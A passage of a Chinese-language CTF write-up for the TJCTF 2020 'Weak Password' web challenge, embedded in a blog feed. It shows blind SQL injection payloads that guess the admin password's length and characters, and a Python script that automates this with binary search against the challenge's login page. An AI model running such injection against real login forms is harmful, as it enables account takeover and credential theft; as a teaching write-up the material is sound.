-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/03.png?raw=true"></div><div class="group-picture-column" style="width: 50%;"><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/04.png?raw=true"></div></div></div></div>
-
-<p>例如，猜<code>password</code>長度：</p>
-<p><code>admin&#39; and length(password) &gt; 13 -- </code> –&gt; success</p>
-<p><code>admin&#39; and length(password) &gt; 14 -- </code> –&gt; fail</p>
-<p><code>admin&#39; and length(password) = 14 -- </code> –&gt; success</p>
-<p>可以猜到<code>password</code>長度為14。<br><br></p>
-<p>又例如，猜<code>password</code>第一個字元：</p>
-<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;a&#39;) -- </code> –&gt; success</p>
-<p><code>admin&#39; and unicode(substr(password, 1)) &gt; unicode(&#39;b&#39;) -- </code> –&gt; fail</p>
-<p><code>admin&#39; and unicode(substr(password, 1)) = unicode(&#39;b&#39;) -- </code> –&gt; success</p>
-<p>可以猜到<code>password</code>第一個字元為<code>b</code>。</p>
-<br>
-再來就是寫Code了，可以搭配 **Binary search** 加速搜尋~
-
-<p>然後用回傳的request長度判斷結果是否成功。</p>
-<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send request and get result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span>(<span class="params">n, opr, char</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://weak_password.tjctf.org/login&#x27;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; and unicode(substr(password, &#123;&#125;)) \\</span></span><br><span class="line"><span class="string">    &#123;&#125; unicode(&#x27;&#123;&#125;&#x27;)-- &quot;</span>.format(n, opr,char), <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> len(r.text)==<span class="number">1842</span> <span class="keyword">else</span> <span class="literal">False</span> <span class="comment">#1842:success</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">li = list(string.digits + string.ascii_lowercase)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    </span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = len(li) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># end up binary search if it can&#x27;t checkout any character</span></span><br><span class="line">    <span class="keyword">if</span> inject(i, <span class="string">&#x27;&gt;&#x27;</span>, li[<span class="number">0</span>]) == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&#x27;password: &#x27;</span>+res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        mid = (l +(r+<span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#print(l, r, mid)</span></span><br><span class="line">        <span class="keyword">if</span> inject(i, <span class="string">&#x27;=&#x27;</span>, li[mid]):</span><br><span class="line">            res = res + li[mid]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">&#x27;&gt;&#x27;</span>, li[mid]):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">elif</span> inject(i, <span class="string">&#x27;&lt;&#x27;</span>, li[mid]):</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>
-
-<h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><img src="https://github.com/MacacaHub/CTF-writeups/blob/master/TJCTF%202020/Weak%20Password/05.png?raw=true" width="500" align="center"/>
-
-<blockquote>
-<p>tjctf{blindsqli14519}</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>TJCTF 2020</tag>
-        <tag>Web Challenge</tag>
       </tags>
   </entry>
   <entry>
